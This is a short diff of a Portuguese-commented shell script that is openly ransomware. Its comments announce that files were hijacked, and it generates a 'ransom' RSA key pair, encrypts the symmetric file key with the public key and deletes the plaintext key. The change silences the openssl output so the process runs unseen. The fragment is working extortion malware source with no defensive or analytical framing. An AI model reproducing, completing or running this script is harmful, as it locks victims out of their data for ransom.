@@ -36,13 +36,13 @@ echo "$1 arquivos sequestrados com sucesso!
 echo "----------------------------------------------"
 
 # vamos gerar um nova chave para proteger minha chave privada necessária para resgate
-openssl genrsa -out resgate.pem 4096
+openssl genrsa -out resgate.pem 4096 > /dev/null 2>&1
 
 # extrair a chave publica que vai ser usada para encriptar a "chave da chave"
-openssl rsa -in resgate.pem -outform PEM -pubout -out resgate-pub.pem
+openssl rsa -in resgate.pem -outform PEM -pubout -out resgate-pub.pem > /dev/null 2>&1
 
 # vamos pegar a chave simetrica e encriptar usando a chave publica recém criada
-openssl rsautl -in chave.key -out chave.enc -encrypt -pubin -inkey resgate-pub.pem
+openssl rsautl -in chave.key -out chave.enc -encrypt -pubin -inkey resgate-pub.pem > /dev/null 2>&1
 
 # remover as chaves temporárias
 rm -rf chave.key
